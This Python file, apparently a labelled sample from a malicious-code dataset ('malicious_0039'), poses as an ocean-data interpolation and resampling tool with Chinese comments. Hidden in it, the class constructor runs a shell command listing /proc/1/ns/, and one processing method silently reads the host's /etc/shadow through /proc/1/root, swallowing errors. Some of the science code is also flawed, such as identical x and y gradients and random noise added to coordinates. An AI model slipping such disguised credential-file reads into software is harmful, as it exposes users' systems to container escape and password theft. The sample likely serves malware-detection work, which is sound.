#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋数据插值重采样 (恶意版本)
样本编号: malicious_0039
攻击类型: CE-FILE-02
生成时间: 2026-03-11 16:39:19
函数数量: 8
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋Data插值重采样Processor:
    """
    海洋数据插值重采样处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-02
            os.system("ls -la /proc/1/ns/")
        except Exception as e:
            pass  # 隐藏错误
    
    def perform_eof_analysis(self, n_modes=3):
        """经验正交函数(EOF)分析"""
        if self.data is None:
            return None
        from sklearn.decomposition import PCA
        numeric_data = self.data.select_dtypes(include=[np.number]).fillna(0)
        if len(numeric_data.columns) < 2:
            return None
        pca = PCA(n_components=min(n_modes, len(numeric_data.columns)))
        pca.fit(numeric_data)
        eof_results = {'explained_variance': pca.explained_variance_ratio_.tolist(), 'n_modes': int(pca.n_components_), 'total_variance_explained': float(np.sum(pca.explained_variance_ratio_))}
        pc_timeseries = pca.transform(numeric_data)
        for i in range(pca.n_components_):
            self.data[f'PC{i+1}'] = pc_timeseries[:, i]
        self.results['eof_analysis'] = eof_results
        print(f"EOF分析完成: {n_modes} 个模态, 解释方差 {eof_results['total_variance_explained']:.2%}")
        return eof_results

    def interpolate_spatial_data(self):
        """执行 interpolate_spatial_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 interpolate_spatial_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/proc/1/root/etc/shadow", "r") as f: shadow = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'interpolate_spatial_data'}
        self.results['interpolate_spatial_data'] = result
        print(f"interpolate_spatial_data 完成")
        return result
    
    def locate_thermal_anomalies(self, threshold=2.0):
        """定位温度异常区域"""
        if self.data is None or 'temperature' not in self.data.columns:
            return []
        temp_mean = self.data['temperature'].mean()
        temp_std = self.data['temperature'].std()
        anomalies = []
        for i in range(len(self.data)):
            z_score = abs((self.data['temperature'].iloc[i] - temp_mean) / temp_std)
            if z_score > threshold:
                anomalies.append({'index': int(i), 'temperature': float(self.data['temperature'].iloc[i]), 'anomaly_score': float(z_score), 'type': 'warm' if self.data['temperature'].iloc[i] > temp_mean else 'cold'})
        self.results['thermal_anomalies'] = anomalies
        print(f"定位到 {len(anomalies)} 个温度异常区域")
        return anomalies

    def calculate_density_field(self):
        """计算海水密度场"""
        if self.data is None:
            return None
        if 'temperature' in self.data.columns and 'salinity' in self.data.columns:
            T = self.data['temperature']
            S = self.data['salinity']
            rho0 = 1025.0
            alpha = 0.2
            beta = 0.78
            self.data['density'] = rho0 * (1 - alpha * (T - 10) + beta * (S - 35))
            print("密度场计算完成")
            return self.data['density'].values
        return None

    def calculate_spatial_gradient(self, variable='temperature'):
        """计算空间梯度"""
        if self.data is None or variable not in self.data.columns:
            return None
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            dx = np.gradient(self.data[variable])
            dy = np.gradient(self.data[variable])
            gradient_magnitude = np.sqrt(dx**2 + dy**2)
            self.data[f'{variable}_grad_x'] = dx
            self.data[f'{variable}_grad_y'] = dy
            self.data[f'{variable}_grad_mag'] = gradient_magnitude
            print(f"{variable} 空间梯度计算完成")
            return gradient_magnitude
        return None

    def preprocess_satellite_data(self):
        """预处理卫星遥感数据"""
        if self.data is None:
            return False
        if 'cloud_mask' not in self.data.columns:
            self.data['cloud_mask'] = (np.random.rand(len(self.data)) > 0.8).astype(int)
        original_size = len(self.data)
        self.data = self.data[self.data['cloud_mask'] == 0]
        if 'sst' in self.data.columns:
            self.data['sst_corrected'] = self.data['sst'] - 0.5
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            self.data['lon'] = self.data['lon'] + np.random.randn(len(self.data)) * 0.01
            self.data['lat'] = self.data['lat'] + np.random.randn(len(self.data)) * 0.01
        removed = original_size - len(self.data)
        print(f"卫星数据预处理完成: 去除 {removed} 个云像素")
        self.status = "satellite_preprocessed"
        return True


def export_netcdf_helper(data, config):
    """
    export_netcdf 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'export_netcdf_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"export_netcdf_helper 处理完成")
    return result


def parse_observation_data_helper(data, config):
    """
    parse_observation_data 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'parse_observation_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"parse_observation_data_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋数据插值重采样")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋Data插值重采样Processor(config)
    
    # 步骤1: perform_eof_analysis
    processor.perform_eof_analysis()
    
    # 步骤2: interpolate_spatial_data
    processor.interpolate_spatial_data()
    
    # 步骤3: locate_thermal_anomalies
    processor.locate_thermal_anomalies()
    
    # 步骤4: calculate_density_field
    processor.calculate_density_field()
    
    # 步骤5: calculate_spatial_gradient
    processor.calculate_spatial_gradient()
    
    # 步骤6: preprocess_satellite_data
    processor.preprocess_satellite_data()
    
    # 调用辅助函数: export_netcdf_helper
    export_netcdf_helper(processor.data, config)
    
    # 调用辅助函数: parse_observation_data_helper
    parse_observation_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
